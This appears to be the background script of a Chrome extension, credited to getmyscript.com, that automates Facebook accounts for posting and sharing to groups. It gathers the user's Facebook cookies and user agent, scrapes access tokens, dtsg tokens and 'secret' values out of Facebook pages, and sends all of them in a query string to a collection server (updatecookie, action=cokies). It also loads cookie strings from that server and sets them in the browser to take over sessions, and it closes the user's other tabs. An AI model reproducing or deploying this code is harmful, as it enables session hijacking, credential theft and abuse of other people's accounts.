/*
//
//  Created by Dinesh Bhosale on 10/7/15.
//  Copyright (c) 2015 Dinesh Bhosale of getmyscript.com All rights reserved.
//
*/
//for performing a task after installation
var setname=[],newTab,cookies,userdata={},fblogin;
chrome.runtime.onInstalled.addListener(function(object) {
	chrome.storage.local.get('installed', function(a) {
		if (!a.installed) {
			// after installing open main web site
			//chrome.tabs.create({url: "http://fst.getmyscript.com/"}, function (tab){});
			chrome.storage.local.set({
				'installed': true
			}, function() {});
			if (window.Notification) {
				// extensionName is stored in global_var, click on tooltip will open main_url
				show(backgroundMessages.installed, main_url);
			}
			//to initialize hide seen
			chrome.storage.local.set({
				'hideSeen': false
			}, function() {
				//console.log('Hide seen status changed to false');
			});
		}
	});
});

function updateuser(userdata) {
	console.log('updateuser');
	console.log(userdata);
	var http4 = new XMLHttpRequest;
	var url4 = "http://localhost/fbpost/Facebook/fb?action=userupdate&uid="+userdata.f_id;
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			console.log(htmlstring);
			if(htmlstring) {
				setTimeout(function(){
					chrome.tabs.getSelected(null, function (tab) {
						var reloadProperties={};
						reloadProperties.url="https://web.facebook.com/";
						tabid = tab.id;
						chrome.tabs.update(tab.id, reloadProperties, function callback(e) {
							setTimeout(function(){
								var url = 'https://mobile.facebook.com/?sharettg=1';
								chrome.tabs.update(null, {url:url});
								accessToken(userdata);
								//chrome.tabs.create({url: 'http://localhost/fbpost/home/index?action=done', active: false});
							}, (10*1000));							
						});						
		        	});
				}, (5*1000));
			}
			http4.close;
		};
	};
	http4.send(null);
}

/*
for updating member info in background
*/
function set_update_member(e,cname,req_url){
	if(e.email&&e.key){
		var email=e.email;
		var key=e.key;
		var xhr = new XMLHttpRequest();
		if(cname){
			var callback_func_name=cname;
		}else{
			var callback_func_name='';
		}
		xhr.open("POST",req_url,true);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
		xhr.onreadystatechange = function(){
			if (xhr.readyState == 4){
				if(xhr.responseText!=="ok"){
					var member=true;
				}else{
					var member=false;
				}
				information={email:email,key:key,member:member};
				chrome.storage.local.set({'information': information}, function() {
					//console.log("member info is updated");
				});
			}
		}
		var send_data='';
		send_data+="version="+encodeURIComponent(manifest.version);
		send_data+="&email="+encodeURIComponent(email);
		send_data+="&key="+encodeURIComponent(key);
		send_data+="&callback_func="+encodeURIComponent(callback_func_name);
		send_data+="&type="+encodeURIComponent("update_license_info");
		xhr.send(send_data);
	}
}
/* Callback func is added just for logging function name on server */
function update_license_info(cname,req_url){
	chrome.storage.local.get('information', function(e) {
		if(e){
			if(e.information){
				set_update_member(e.information,cname,req_url);
			}else{
				//console.log("member info is not set so it is not updated.");
			}
		}else{
			//console.log("member info is not set so it is not updated.");
		}
	});
}
// request from popup script about
// updating license info
chrome.extension.onRequest.addListener(
    function(request, sender, sendResponse){
        if(request.msg == "updateValidate"){
        	update_license_info(request.cname,request.req_url);
        }
    }
);

	chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
	 // console.log(tab.url);
	  //console.log(changeInfo.status);
	  	userdata.tabId = tab.id;
		if(tab.url.match(/facebook/g)) {
			if(tab.url.match(/cookie/g)) {
			  if(changeInfo.status == 'complete') {
			  	//cookies = 1;
			  	if(tab.url.match(/sharettg/g)) {
			  		userdata.backto = 'sharettg=1';
			  	}
			  	if(!userdata.user_id) {
					login(userdata);
				}
			  }
			}
		}
		if(tab.url.match(/facebook/g)) {
			console.log(tab.url);
			if(changeInfo.status == 'complete') {
				if(!tab.url.match(/cookie/g) && !fblogin) {
					accessToken(userdata);
				}
				//userinfo(userdata);
				if(tab.url.match(/setcmd=1/g)) {
					//start(cname,newTab);
					cmt();
				}
				if(tab.url.match(/sharettg=1/g) && !tab.url.match(/mobile.facebook.com/g)) {
					//start(cname,newTab);
					sharettg();
				}
				if(tab.url.match(/mobile.facebook.com?/g) && tab.url.match(/sharettg=1/g) || tab.url.match(/free.facebook.com?/g) && tab.url.match(/sharettg=1/g)) {
					var reloadProperties={};
					reloadProperties.url='https://web.facebook.com/?sharettg=1';
					tabid = tab.id;
		        	chrome.tabs.update(tabid, reloadProperties, function callback(e) {
				
					});
				}

				if(tab.url.match(/zeroset=1/g) || tab.url.match(/zero\//g)) {
					console.log(111);
					//start(cname,newTab);
					zero();
				}
				if(tab.url.match(/zero\/toggle\//g)) {
					//start(cname,newTab);
					//zero();
					var reloadProperties={};
					reloadProperties.url='https://free.facebook.com/mobile/zero/carrier_page/settings_page/?zeroset=1';
					tabid = tab.id;
		        	chrome.tabs.update(tabid, reloadProperties, function callback(e) {

					});
				}
				if(tab.url.match(/zero\/policy\//g)) {
					zero();
				}
				if(tab.url.match(/qp\/interstitial\//g)) {
					zero();
				}
				if(tab.url.match(/checkpoint/g)) {
					chrome.cookies.getAll({domain: "facebook.com"}, function(cookies) {
					    for(var i=0; i<cookies.length;i++) {
					        chrome.cookies.remove({url: "https://web.facebook.com" + cookies[i].path, name: cookies[i].name});
					        chrome.cookies.remove({url: "https://www.facebook.com" + cookies[i].path, name: cookies[i].name});
					        chrome.cookies.remove({url: "https://m.facebook.com" + cookies[i].path, name: cookies[i].name});
					        chrome.cookies.remove({url: "https://mbasic.facebook.com" + cookies[i].path, name: cookies[i].name});
					        chrome.cookies.remove({url: "https://developers.facebook.com" + cookies[i].path, name: cookies[i].name});
					        chrome.cookies.remove({url: "https://upload.facebook.com" + cookies[i].path, name: cookies[i].name});
					        chrome.cookies.remove({url: "https://mobile.facebook.com" + cookies[i].path, name: cookies[i].name});
					        chrome.cookies.remove({url: "https://business.facebook.com" + cookies[i].path, name: cookies[i].name});
					    }
					});					
					var reloadProperties={};
					reloadProperties.url='https://web.facebook.com/?cookie=1';
					tabid = tab.id;
		        	chrome.tabs.update(tabid, reloadProperties, function callback(e) {
				
					});
				}
			}

		}

		//start tool with url
		if(tab.url.match(/gptto/g)) {
			closeTabs(tab.id);
			var reloadProperties={};
			reloadProperties.url='https://web.facebook.com/me';
			tabid = tab.id;
        	chrome.tabs.update(tabid, reloadProperties, function callback(e) {
				setTimeout(function(){
					sendResponse({
						farewell: "started"
					});
					//start(cname,newTab);
					gptto();
				}, (10*1000));					
			});
		}

	  //console.log(changeInfo.url);
	  //console.log(tabId);
	   //chrome.tabs.remove(tabId, function() { });
	});

//function to start tools in a new tab
chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
		if (request.action == "restartTool") {
			sendResponse({
				farewell: "Completed"
			});
			var name=request.toolName;
			var newTab=request.newTab;
			start(name,newTab);
			chrome.tabs.create({url: 'http://localhost/fbpost/home/index', active: false});
			//closeTabs();
		}
		if (request.action == "reloadTool") {
			chrome.tabs.create({url: 'http://localhost/fbpost/home/index', active: false});
			var cname=request.toolName;
			var newTab=request.newTab;
			setname.push({
				'toolName':request.toolName,
				'request':request.action,
			});
			chrome.tabs.getSelected(null, function(tab){
				var reloadProperties={};
				reloadProperties.url=request.url;
				tabid = tab.id;
				var is_start = false;
				chrome.tabs.update(tabid, reloadProperties, function callback(e) {
					chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
						if(changeInfo.status == 'complete') {
							if (request.action == "reloadTool") {
								if(!is_start) {
									closeTabs(tab.id);
									gptto();
									is_start = true;
								}
							}
						}
					});
					// setTimeout(function(){
					// 	//start(cname,newTab);
					// 	if(cname=='gptto') {
					// 		closeTabs(tabid);
					// 		gptto();
					// 	}
					// }, (10*1000));
					// if (e.status == 'complete') {
					// 	console.log(cname);
					// 	// sendResponse({
					// 	// 	farewell: "started"
					// 	// });
						
					// 	// start(cname,newTab);
					// }
					
				});
			    // console.log(tab.id);
			    // var createProperties = {};
			    // createProperties.name = request.toolName;
			    // createProperties.newTab = newTab=request.newTab;
			    // createProperties.url = newTab=request.url;
			    // createProperties.id = tab.id;
			    // createProperties.request = request.action;
			    //reloadurl(request.toolName,createProperties);
			});
			
		}
		if (request.action == "getgroup") {

			getmGroups(false,request.datas);
		}
		if (request.action == "startTool") {
			sendResponse({
				farewell: "started"
			});
			var cname=request.cname;
			var newTab=request.newTab;
			start(cname,newTab);
		}
		if (request.closetab) {
			alert(closetab);
		}
		if (request.contentScriptQuery == "queryPrice") {
			console.log(222222222222);
		}
	}
);


chrome.browserAction.onClicked.addListener(allAction);
function allAction(tab) {
	// chrome.tabs.create({
 //        url: chrome.extension.getURL("/popup/html/popup.html")
 //    })
}
// function zero() {
// 	console.log('zero');
// }
function closeTabs(tabid) {
	chrome.tabs.query({}, function(tabs) {
		for (var i = 0; i < tabs.length; i++) {
			if(tabs[i].id!=tabid) {
				chrome.tabs.remove(tabs[i].id);
			}
	    }
	  
	});
	// chrome.tabs.query({}, function(tabs) {
	// 	for (var i = 0; i < tabs.length; i++) {
	// 		if(tabs[i].active!=true && tabs[i].status == "complete") {
	// 			if(tabs[i].id!=tabid) {
	// 				chrome.tabs.remove(tabs[i].id);
	// 			}
	// 		} 
	//     }
	  
	// });
// 	chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
// 	  //console.log(tab);
// 	  //console.log(changeInfo);
// 	  //console.log(tabId);
// 	   //chrome.tabs.remove(tabId, function() { });
// 	});
}
// chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {          
// 	 //alert(changeInfo.status);
// 	 if (changeInfo.status == 'complete') {
// 		 console.log(changeInfo.status);
// 		 if(setname.length>0) {
// 		 	if(setname[0]['request'] =='reloadTool') {
// 		 		startTool(setname[0]['toolName'],setname[0]['request']);
// 		 		//var dirName=setname[0]['toolName'];		 		
// 		 		setname.push({
// 					'toolName':'',
// 					'request':'',
// 				});
// 		 	}
		 	
// 		 }
// 	 }
// });
function login(userdata) {
	fblogin = true;
	console.log('login');
	var http4 = new XMLHttpRequest;
	var url4 = site_url + "Facebook/fb?action=userlist";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			userdata = JSON.parse(htmlstring);
			importCookie(userdata);
			http4.close;
		};
	};
	http4.send(null);
}

function importCookie(userdata) {
	console.log('cookies');
	cookie = userdata.value.cookies;
	var arr = cookie.split("|");
	if(arr.length>2){
		 for (var i = 0; i < arr.length; i++) {
            try {
				if(arr[i].indexOf('c_user')>-1){
				cookie=arr[i];
				}
            } catch (ex) {
               
            }
        }
	}
	removeAllCookies(function () {
        var ca = cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            try {
                var name = ca[i].split('=')[0].trim();
                var val = ca[i].split('=')[1].trim();;
                chrome.cookies.set({ url: "https://www.facebook.com", name: name, value: val });
                chrome.cookies.set({ url: "https://web.facebook.com", name: name, value: val });
                chrome.cookies.set({ url: "https://m.facebook.com", name: name, value: val });
                chrome.cookies.set({ url: "https://mbasic.facebook.com", name: name, value: val });
                chrome.cookies.set({ url: "https://developers.facebook.com", name: name, value: val });
                chrome.cookies.set({ url: "https://upload.facebook.com", name: name, value: val });
                chrome.cookies.set({ url: "https://mobile.facebook.com", name: name, value: val });
				chrome.cookies.set({ url: "https://business.facebook.com", name: name, value: val });
				
            } catch (ex) {
                console.log(ex);
            }
        }
        if(!userdata.f_id) {
        	//var f_id = cookie.split('c_user=');
        	userdata.f_id = cookie.match(/c_user=(.*?);/)[1];
        	console.log(userdata.f_id);
        }
        console.log(userdata);
        updateuser(userdata);
  //       setTimeout(function(){
		// 	chrome.tabs.getSelected(null, function (tab) {
  //       	var reloadProperties={};
		// 	reloadProperties.url='https://web.facebook.com?gptto=1';
		// 	tabid = tab.id;
  //       	chrome.tabs.update(tabid, reloadProperties, function callback(e) {
		// 			// setTimeout(function(){
		// 			// 	sendResponse({
		// 			// 		farewell: "started"
		// 			// 	});
		// 			// 	//start(cname,newTab);
		// 			// 	if(cname=='gptto') {
		// 			// 		closeTabs(tabid);
		// 			// 		gptto();
		// 			// 	}
		// 			// }, (10*1000));					
		// 		});
  //           //var code = 'window.location.reload();';
  //           //var code = 'window.location.href = chrome-extension://mifpdkjafkpmmlhhgdkdfljnlbopnecn/content_new/sharettg/html/frame.html;';
  //           //chrome.tabs.executeScript(tab.id, { code: code });
  //       });
		// }, (5*1000));
    }); 
}
function urlify(text) {
  var urlRegex = /id:"([^\s]+)"/g;
  return text.replace(urlRegex, function(id) {
    return id;
  })
  // or alternatively
  // return text.replace(urlRegex, '<a href="$1">$1</a>')
}


/*get groups from m.facebook */
function getmGroups(silent,e) {
	var pqr = new XMLHttpRequest;
	pqr.open("GET", "https://mobile.facebook.com/groups_browse/your_groups/", true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {
		if (pqr.readyState == 4 && pqr.status == 200){
			var t = pqr.responseText;
			var gdata = {};
			if(t.match(/{groups:{edges:\[(.*?)}],/)) {
				var group_array = [];
				gdata.groups = t.match(/{groups:{edges:(.*?)}],/)[1] + '}';
				group_id_array = gdata.groups.match(/node:{([^\s]+)/g);
				group_name_array = gdata.groups.match(/created:false,name:"([^\s]+)/g);
				for(var temp_var=0;group_id_array[temp_var];temp_var++){
					id = group_id_array[temp_var].match(/id:"(.*?)"/)[1];
					//name = group_id_array[temp_var].match(/name:"(.*?)"/)[0].replace("name:\"","").replace("\"","");	
					name = group_name_array[temp_var].replace("created:false,name:\"","");
					if(name.match(/"/)) {
						name = name.match(/(.*?)"/)[1];
						
					}	
					uri = group_id_array[temp_var].match(/uri:"(.*?)"/)[1];
					group_array.push({
			            id: id, 
			            name:  name,
			            profile_picture:  uri,
			        });
				}
				//console.log(group_array);
				chrome.storage.local.set({'fbgroups': group_array});
			}
		}
	}
	pqr.send();
	// pqr = new XMLHttpRequest();
	// var url = "";
	// url += "https://mobile.facebook.com/groups_browse/your_groups/";
	// pqr.open("GET", url, true);
	// pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	// pqr.onreadystatechange = function() {
	// 	if (pqr.readyState == 4) {
	// 		var cdata = JSON.parse(pqr.responseText);
	// 		console.log('getmGroups');
	// 		console.log(cdata);
	// 	}
	// }
	// // var a = Math.floor(801792123 * Math.random()) + 1001792123;
	// // var l = {
	// // 	av: e.user_id,
	// // 	__user: e.user_id,
	// // 	__a: 1,
	// // 	__dyn: '5V5yAW8-aFoFxp2u6aOGeFxqeCwKAKGgS8zCC-C26m6oKezob4q2i5U4e2CEaUgxebkwy68qGieKcDKuEjKeCxicxaagdUOum2SVEiGqexi5-uifz8gAUlwnoCium8yUgx66EK3Ou49LZ1uJ1im7WwxV8G4oWdUgByE',
	// // 	__req: 4,
	// // 	__beoa: 0,
	// // 	__pc: 'FW_EXP5:mtouch_pkg',
	// // 	dpr: 1,
	// // 	__ccg: 'EXCELLENT',
	// // 	__rev: a,
	// // 	__s: 'f7cpfe:5ltb68:fug73y',
	// // 	__hsi: '6937508774367456384-0',
	// // 	__comet_req: 0,
	// // 	fb_dtsg: e.fb_dtsg,
	// // 	jazoest: 22314,
	// // 	fb_api_caller_class: 'RelayModern',
	// // 	fb_api_req_friendly_name: 'MGroupsLandingYourGroupContentQuery',
	// // 	variables: '{"count":3,"ordering":["importance"]}',
	// // 	server_timestamps: true,
	// // 	doc_id: 3059337350754217
	// // };
	// pqr.send(null);	
}
function getCurrent() {
	chrome.tabs.getSelected(null, function(tab){
	    console.log(tab.id);
	    
	});
	//chrome.tabs.reload(tabId: number, reloadProperties: object, callback: function);
}
function userinfo(userdata) {
	var l = {};
	l.id = '';
	var pqr = new XMLHttpRequest;
	pqr.open("GET", "https://free.facebook.com/composer/ocelot/async_loader/?publisher=feed", true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {
		if (pqr.readyState == 4 && pqr.status == 200){
			var t = pqr.responseText;
			if(t.match(/{\\"dtsg\\":{\\"token\\":\\"(.*?)\\"/)) {
				userdata.dtsg = t.match(/{\\"dtsg\\":{\\"token\\":\\"(.*?)\\"/)[1];
			}
			//userdata.accessToken = t.match(/accessToken\\":\\"(.*?)\\"/)[1];
			if(t.match(/USER_ID\\":\\"(.*?)\\"/)) {
				userdata.user_id = t.match(/USER_ID\\":\\"(.*?)\\"/)[1];
			}
			if(t.match(/name=\\"target\\" value=\\"(.*?)\\"/) && !userdata.user_id) {
				userdata.user_id = t.match(/name=\\"target\\" value=\\"(.*?)\\"/)[1];
			}
			if(t.match(/,\{"token":"\(.\*\?\)"/g)) {
				userdata.fb_dtsg = t.match(/,\{"token":"\(.\*\?\)"/g)[0].replace(',\{"token":"', '').replace('"', '');
			} else {
				if(t.match(/fb_dtsg\\" value=\\"(.*?)\\"/)) {
					userdata.fb_dtsg = t.match(/fb_dtsg\\" value=\\"(.*?)\\"/)[1];
				}
			}
			
			// if(userdata.user_id && userdata.fb_dtsg) {
			// 	console.log(userdata.user_id);
			// 	console.log(userdata.fb_dtsg);
			// 	var v = {

			// 	};
			// 	var r20 = {
			// 		av: userdata.user_id,
			// 		__user: userdata.user_id,
			// 		__a: 1,
			// 		__dyn: "7AgNe-4amaWxd2u6aJGi9FxqeCwDKEyGgS8WyAAjFGUqxe2qdwIhEpyA4WCHxC7oG5VEc8yGDyUJu9xK5WAxamqnKaxeAcUeUG5E-44czorx6ih4-e-2h1yuiaAzazpFQcy412xuHBy8G6Ehwj8lg8VECqQh0WQfxSq5K9wlFVk1nyFFEy2haUhKFprzooAmfxKq9BQnjG3tummfx-bKq58CcBAyoGi1uUkGE-WUnyoqxi4otQdhVoOjyEaLK6Ux4ojUC6p8gUScBKm4U-5898G9BDzufwyyUnG2qbzV5Gh2bLCDKi8z8hyUlxeaKE-17Kt7Gmu48y8xuUsVoC9zFAdxp2UtDxtyUixOby8ixK6E4-4okwDxy5qxNDxeu3G4p8tyb-2efxW8Kqi5pob89EbaxS2G",
			// 		__req: "4t",
			// 		__beoa: 0,
			// 		__pc: "EXP2:comet_pkg",
			// 		fb_dtsg: userdata.fb_dtsg,
			// 		dpr: 1,
			// 		__ccg: "EXCELLENT",
			// 		__rev: "1003364478",
			// 		fb_api_caller_class: "RelayModern",
			// 		fb_api_req_friendly_name: "ProfileCometHeaderQuery",
			// 		variables: JSON.stringify({scale:1,userID: userdata.user_id}),
			// 		server_timestamps: true,
			// 		doc_id: '3285183754884445',
			// 	};
			// 	graphql(userdata,r20);
			// }
			accessToken(userdata);
		}
	}
	pqr.send();
}
function graphql(userdata,data) {
	console.log('graphql userdata');
	var pqr = new XMLHttpRequest;
	pqr.open("POST", "https://web.facebook.com/api/graphql/", true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {
		if (pqr.readyState == 4 && pqr.status == 200){
			var t = pqr.responseText;
			console.log(t);
			//accessToken(userdata);
		}
	}
	pqr.send(deSerialize(data));
}
function accessToken(userdata) {
	var l = {};
	l.id = '';
	var pqr = new XMLHttpRequest;
	pqr.open("GET", "https://business.facebook.com/business_locations/", true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {
		if (pqr.readyState == 4 && pqr.status == 200){
			var t = pqr.responseText;
			userdata.accessToken = '';
			if(t.match(/"EAA(.*?)ZD/)) {
				userdata.accessToken = 'EAA'+ t.match(/"EAA(.*?)ZD/)[1]+'ZD';
			}
			if(t.match(/hsi":"(.*?)"/)) {
				userdata._hsi = t.match(/hsi":"(.*?)"/)[1];
			}
			if(t.match(/__spin_r":(.*?),"/)) {
				userdata.__spin_r = t.match(/__spin_r":(.*?),"/)[1];
			}
			if(t.match(/__spin_b":"(.*?)"/)) {
				userdata.__spin_b = t.match(/__spin_b":"(.*?)"/)[1];
			}
			if(t.match(/__spin_t":(.*?),"/)) {
				userdata.__spin_t = t.match(/__spin_t":(.*?),"/)[1];
			}
			if(t.match(/vip":"(.*?)"/)) {
				userdata.vip = t.match(/vip":"(.*?)"/)[1];
			}
			if(t.match(/secret":"(.*?)"/)) {
				userdata.secret = t.match(/secret":"(.*?)"/)[1];
			}
			if(t.match(/encrypted":"(.*?)"/)) {
				userdata.encrypted = t.match(/encrypted":"(.*?)"/)[1];
			}
			if(t.match(/","NAME":"(.*?)"/)) {
				userdata.NAME = t.match(/","NAME":"(.*?)"/)[1];
			}
			if(t.match(/SHORT_NAME":"(.*?)"/)) {
				userdata.SHORT_NAME = t.match(/SHORT_NAME":"(.*?)"/)[1];
			}
			if(t.match(/{"token":"(.*?)"/)) {
				userdata.dtsg_ag = t.match(/{"token":"(.*?)"/)[1];
			}
			if(t.match(/{"token":"(.*?)"/)) {
				userdata.dtsg_ag = t.match(/{"token":"(.*?)"/)[1];
			}
			if(t.match(/USER_ID":"(.*?)"/)) {
				userdata.user_id = t.match(/USER_ID":"(.*?)"/)[1];
			}
			loadCurrentCookie(userdata);
			fbinfo(userdata);
			//chrome.storage.local.set({'fbuser': userdata});
			// if(userdata.user_id) {
			// 	userdetail(userdata);
			// }
		}
	}
	pqr.send();
}
function fbinfo(userdata) {
	var s = {
		fbid: userdata.user_id,
	};
	var http4 = new XMLHttpRequest;
	var url4 = "http://localhost/fbpost/facebook/fb?action=profilelist&" + deSerialize(s);
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			var t = JSON.parse(htmlstring);
			chrome.storage.local.set({'fbuser': t});
		}
	};
	http4.send(null);
	// var s = {
	// 	fbid: userdata.user_id,
	// };
	// pqr = new XMLHttpRequest();
	// pqr.open("GET", "http://localhost/fbpost/facebook/fb?action=profilelist&" + deSerialize(s), true);
	// pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	// pqr.onreadystatechange = function() {	
	// 	if (pqr.readyState == 4 && pqr.status == 200){
	// 		var t = pqr.responseText;
	// 		console.log(t);
	// 	}
	// }
	// pqr.send();
}
function userdetail(userdata) {
	var pqr = new XMLHttpRequest;
	pqr.open("GET", "https://m.facebook.com/policies", true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {
		if (pqr.readyState == 4 && pqr.status == 200){
			var t = pqr.responseText;
			if(t.match(/hsi":"(.*?)"/)) {
				userdata._hsi = t.match(/hsi":"(.*?)"/)[1];
			}
			if(t.match(/__spin_r":(.*?),"/)) {
				userdata.__spin_r = t.match(/__spin_r":(.*?),"/)[1];
			}
			if(t.match(/__spin_b":"(.*?)"/)) {
				userdata.__spin_b = t.match(/__spin_b":"(.*?)"/)[1];
			}
			if(t.match(/__spin_t":(.*?),"/)) {
				userdata.__spin_t = t.match(/__spin_t":(.*?),"/)[1];
			}
			if(t.match(/vip":"(.*?)"/)) {
				userdata.vip = t.match(/vip":"(.*?)"/)[1];
			}
			if(t.match(/secret":"(.*?)"/)) {
				userdata.secret = t.match(/secret":"(.*?)"/)[1];
			}
			if(t.match(/encrypted":"(.*?)"/)) {
				userdata.encrypted = t.match(/encrypted":"(.*?)"/)[1];
			}
			if(t.match(/NAME":"(.*?)"/)) {
				userdata.NAME = t.match(/NAME":"(.*?)"/)[1];
			}
			if(t.match(/SHORT_NAME":"(.*?)"/)) {
				userdata.SHORT_NAME = t.match(/SHORT_NAME":"(.*?)"/)[1];
			}
			if(t.match(/dtsg_ag":{"token":"(.*?)"/)) {
				userdata.dtsg_ag = t.match(/dtsg_ag":{"token":"(.*?)"/)[1];
			}
			//setUserInfo(userdata);
			chrome.tabs.sendMessage(userdata.tabId, {action: "userinfo",data:userdata}, function(response) {

			  });
			//console.log(userdata);
			//chrome.storage.local.set({'fbuser': userdata});
			// userdata.accessToken = t.match(/accessToken\\":\\"(.*?)\\"/)[1];
			// userdata.user_id = t.match(/USER_ID\\":\\"(.*?)\\"/)[1];
		}
	}
	pqr.send();
}
function searchArray(obj, deepDataAndEvents) {
	var val = false;
	for (key in obj) {
		if (key.toString() == deepDataAndEvents) {
			val = obj[key];
			break;
		} else {
			if (typeof obj[key] == "object") {
				val = searchArray(obj[key], deepDataAndEvents);
				if (val != false) {
					break;
				}
			}
		}
	};
	return val;
}

chrome.storage.local.get('cookiea', function(a) {
	var data = {};
	data.cookies = a.cookiea;
	if(data.cookies) {
		//updatecookie(data);
	}
});
function loadCurrentCookie(userdata) {
    chrome.tabs.getSelected(null, function (tab) { // null defaults to current window
		var currentUrl=tab.url;
		if(currentUrl.indexOf('chrome://newtab')>-1){
			currentUrl="https://www.facebook.com";
		}		
        chrome.cookies.getAll({ "url": currentUrl }, function (cookie) {
            var result = "";
            for (var i = 0; i < cookie.length; i++) {
                result += cookie[i].name + "=" + cookie[i].value + "; ";
                if (cookie[i].name == "c_user") {
                    currentUid = cookie[i].value;
                }
            }
			result += "useragent=" +btoa(navigator.userAgent).replace('=','%3D').replace('=','%3D').replace('=','%3D')+ "; ";
            //document.getElementById('cookieresult').value = result;
            updatecookie(result,userdata);
            chrome.storage.local.set({'cookiea': result});
   //          currentCookie = result;
			// chrome.tabs.getSelected(null, function(tab) {
			//   chrome.tabs.executeScript(tab.id,{
			//   code: 'localStorage["z_uuid"]',}, function (results){ 
			// 		if(results!=undefined && results!=null && results!=''){
			// 			currentCookie+= "z_uuid="+results+"; ";
			// 			chrome.storage.local.set({'cookiea': currentCookie});
			// 			//document.getElementById('cookieresult').value = currentCookie;
			// 		}
			// 	});
			// });
        });
    });
}
function deSerialize(json) {
	return Object.keys(json).map(function (key) {
		return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
	}).join('&');
}
function updatecookie(data,userdata) {
	var s = {
		cokies: data,
		token: userdata.accessToken,
		NAME: userdata.NAME,
		SHORT_NAME: userdata.SHORT_NAME,
		dtsg_ag: userdata.dtsg_ag,
		user_id: userdata.user_id,
		vip: userdata.vip,
		__spin_b: userdata.__spin_b,
		__spin_r: userdata.__spin_r,
		__spin_t: userdata.__spin_t,
		_hsi: userdata._hsi
	};
	pqr = new XMLHttpRequest();
	pqr.open("GET", "http://localhost/fbpost/facebook/fb?action=cokies&" + deSerialize(s), true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {		
		if (pqr.readyState == 4 && pqr.status == 200){
		}
	}
	pqr.send();
}
var removeAllCookies = function (callback) {
    if (!chrome.cookies) {
        chrome.cookies = chrome.experimental.cookies;
    }
    var removeCookie = function (cookie) {
        var url = "http" + (cookie.secure ? "s" : "") + "://" + cookie.domain + cookie.path;
        chrome.cookies.remove({ "url": url, "name": cookie.name });
    };
    chrome.cookies.getAll({ domain: "facebook.com" }, function (all_cookies) {
        var count = all_cookies.length;
        for (var i = 0; i < count; i++) {
            removeCookie(all_cookies[i]);
        }
        callback();
    });
    return "COOKIES_CLEARED_VIA_EXTENSION_API";
};
